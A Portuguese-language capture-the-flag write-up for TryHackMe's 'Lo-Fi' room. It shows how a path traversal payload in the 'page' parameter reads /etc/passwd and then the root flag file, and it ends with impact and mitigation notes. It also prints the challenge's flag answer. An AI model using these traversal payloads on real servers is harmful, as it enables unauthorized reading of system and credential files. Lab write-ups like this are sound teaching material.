# 🚩 Lo-Fi — TryHackMe  
**Categoria:** Web / LFI (Local File Inclusion)  
**Dificuldade:** Easy  
**Plataforma:** TryHackMe  

---

## Informações Padrão

| Campo | Valor |
|------|-------|
| Nome da máquina | Lo-Fi |
| IP | 10.65.152.57 |
| Sistema | Linux |
| Vetor | Local File Inclusion (LFI) |
| Flag | `flag{e4478e0eab69bd642b8238765dcb7d18}` |

---

## Descrição

O desafio simula um site de streaming de batidas Lo-Fi. O objetivo é explorar uma vulnerabilidade de **Local File Inclusion (LFI)** para navegar pelo sistema de arquivos do servidor e localizar uma flag armazenada na raiz do sistema (`/`).

A aplicação carrega páginas dinamicamente por meio de um parâmetro GET chamado `page`.

---

## 🔍 Reconhecimento Inicial

Acesso inicial à aplicação:

```bash
http://10.65.152.57
```

Ao clicar nos links do site, foi possível observar que todos redirecionavam para URLs no formato:

```bash
?page=
```

Isso indica que o backend provavelmente está incluindo arquivos diretamente com base no valor desse parâmetro, tornando o alvo potencialmente vulnerável a **Directory Traversal / LFI**.

---

## Identificação da Vulnerabilidade

Para validar a falha, foi testado o acesso ao arquivo padrão de usuários do Linux:

```bash
http://10.65.152.57/?page=../../../../etc/passwd
```

### 🚩 Resultado

O servidor retornou corretamente o conteúdo do arquivo:

```text
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
www-data:x:33:33:www-data:/var/www:/bin/sh
nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
...
```

Esse comportamento confirma que a aplicação não está sanitizando corretamente o parâmetro `page`, permitindo a leitura arbitrária de arquivos no sistema.

---

## Enumeração do Sistema de Arquivos

A descrição do desafio informa que a flag está localizada na **raiz do sistema de arquivos (`/`)**.

Utilizando o mesmo método de traversal, foi tentado o acesso direto ao arquivo de flag:

### Tentativa A

```bash
http://10.65.152.57/index.php?page=../../../../flag
```

### Tentativa B

```bash
http://10.65.152.57/index.php?page=../../../../flag.txt
```

---

## 🚩 Captura da Flag

A segunda tentativa retornou com sucesso o conteúdo do arquivo:

```text
flag{e4478e0eab69bd642b8238765dcb7d18}
```

---

## Conclusão

Este desafio demonstra uma implementação insegura de inclusão de arquivos via parâmetro GET, sem validação ou sanitização de entrada do usuário.

### Impacto

Esse tipo de vulnerabilidade pode permitir:
- Leitura de arquivos sensíveis (`/etc/passwd`, configs, credenciais)
- Enumeração de usuários do sistema
- Possível escalonamento para RCE dependendo da configuração do servidor

### 🛡️ Mitigação

- Validar e restringir valores permitidos no parâmetro `page`
- Utilizar listas de inclusão (whitelists)
- Evitar o uso direto de entradas do usuário em funções de inclusão de arquivos
- Normalizar caminhos antes de processar requisições

---

## Referências

- OWASP Top 10 — A05: Security Misconfiguration  
- TryHackMe — Path Traversal / LFI Rooms